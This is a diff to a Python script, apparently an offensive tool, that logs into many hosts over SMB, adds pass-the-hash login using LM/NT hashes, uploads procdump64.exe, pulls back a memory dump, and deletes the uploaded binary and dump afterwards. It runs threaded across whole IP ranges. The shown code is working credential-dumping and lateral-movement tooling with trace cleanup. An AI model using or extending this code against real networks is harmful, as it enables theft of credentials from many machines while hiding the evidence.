@@ -62,16 +62,17 @@ def dump(user, passwd, hashes, out):
     success("Done")
 
 
-def put(smb, file, share):
+def put(smb, lfile, share):
     success("Putting procdump.exe ...")
     try:
-        f = open(file, 'rb')
-        smb.putFile(share, os.path.basename(file), f.read)
+        f = open(lfile, 'rb')
+        smb.putFile(share, os.path.basename(lfile), f.read)
         f.close()
         success("Done")
     except Exception as e:
         print(e)
-        error("Cannot put {}".format(file))
+        error("Cannot put {}".format(lfile))
+
 
 def get(smb, rfile, lfile, share):
     success("Retrieving {} ...".format(rfile))
@@ -83,6 +84,7 @@ def get(smb, rfile, lfile, share):
     except Exception as e:
         print(e)
         error("Cannot get {}".format(rfile))
+
 
 def delete(smb, rfile, share):
     success("Deleting {} ...".format(rfile))
@@ -97,7 +99,15 @@ def delete(smb, rfile, share):
 def run(user, hashes, passwd, share, output, ltarget):
     dumpname = "{}_{}.dmp".format(ltarget, randword(5))
     smb = SMBConnection(ltarget, ltarget)
-    smb.login(user, passwd)
+    lmhash = ""
+    nthash = ""
+
+    if len(hashes):
+        lmhash = hashes.split(":")[0]
+        nthash = hashes.split(":")[1]
+        passwd=''
+
+    smb.login(user, passwd, '', lmhash, nthash)
 
     # TODO select payload from dest arch
     payloadfile = "bin/procdump64.exe"
@@ -109,7 +119,7 @@ def run(user, hashes, passwd, share, output, ltarget):
     get(smb, dumpname, "{}/{}".format(output, dumpname), share)
 
     delete(smb, os.path.basename(payloadfile), share)
-    delete(smb, os.path.basename(dumpname), share)
+    delete(smb, dumpname, share)
 
 if __name__ == '__main__':
 
@@ -143,9 +153,9 @@ if __name__ == '__main__':
                 for x in ipaddress.ip_network(unicode(line.replace("\n", ''), "utf-8")).hosts():
                     targets.append(str(x))
             else:
-                targets.append(line.replace("\n",""))
+                targets.append(line.replace("\n", ""))
 
-    for targets_chunk in chunks(targets,int(args.threads)):
+    for targets_chunk in chunks(targets, int(args.threads)):
         threads_tab = []
         for ltarget in targets_chunk:
             t = threading.Thread(target=run,
